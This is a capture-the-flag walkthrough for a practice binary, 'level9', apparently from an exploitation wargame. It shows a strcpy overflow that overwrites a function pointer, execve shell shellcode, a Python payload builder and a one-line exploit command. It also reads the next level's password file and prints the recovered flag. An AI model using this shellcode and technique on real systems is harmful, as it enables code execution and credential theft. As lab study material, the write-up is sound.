# Level 09 Walkthrough

## Binary analysis

The binary uses function pointers and user-controlled data, making it vulnerable to a buffer overflow. By overflowing a buffer, we can inject shellcode and overwrite a function pointer to execute arbitrary code.

### Key decompiled code

- The program allocates memory and uses user input to set up function pointers and buffers. Eventually, it calls a function pointer that can be overwritten via a buffer overflow.
- Example vulnerable code:
    ```c
    char buffer[...];
    // ...
    strcpy(buffer, user_input); // vulnerable
    // ...
    call function_pointer; // can be overwritten
    ```

## Exploitation

We craft a payload that:
- Injects shellcode into the buffer
- Adds padding to reach the function pointer
- Overwrites the function pointer with the address of our shellcode

Example payload (Python):
```python
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload = b"\x10\xa0\x04\x08" + shellcode + b"A"*76 + b"\x0c\xa0\x04\x08"
with open("payload.txt", "wb") as f:
    f.write(payload)
```
Or directly:
```
./level9 $(python -c 'print("\x10\xa0\x04\x08"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+76*"A"+"\x0c\xa0\x04\x08")')
```

## Commands used

```
./level9 $(python -c 'print("\x10\xa0\x04\x08"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+76*"A"+"\x0c\xa0\x04\x08")')
cat /home/user/bonus0/.pass
```

## Result

After running the exploit, we get the password for bonus0:

```
cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```